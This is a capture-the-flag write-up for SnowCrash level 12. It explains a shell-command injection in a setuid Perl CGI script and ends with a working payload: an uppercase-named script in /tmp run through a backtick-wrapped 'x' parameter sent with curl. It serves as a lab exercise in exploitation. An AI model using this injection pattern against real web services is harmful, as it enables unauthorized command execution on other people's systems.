# Level 12

## The Challenge

The folder contain a perl script named level12.pl owned by flag12. The setuid and setgid bits are set.

```sh
level12@SnowCrash:~$ ls -al
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile
level12@SnowCrash:~$ perl level12.pl
Content-type: text/html

..level12@SnowCrash:~$
```

level12 run a CGI script on port 4646. The script takes two arguments x and y as parmeters and print either a dot or two dots according to those parameters.

```sh
level12@SnowCrash:~$ curl 'localhost:4646?x=hello&y=coucou'
.level12@SnowCrash:~$

```

```perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

## The target

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

This line execute a shell command under flag12 uid. The idee is to inject getflag in $xx such as it will be run at the same time.
Something like `getflag > /tmp/flag`. But this can't be put directly in param x as it will be wrecked by the script before. We put then the command line into a script with a name (HACK) who will pass through the code without dammage.

## The hack

HACK:

```sh
getflag > /tmp/flag
```

```sh
$ vim /tmp/HACK
$ chmod 777 /tmp/HACK
$ touch /tmp/flag
$ curl 'localhost:4646?x=`/*/HACK`'
$ cat /tmp/flag
```
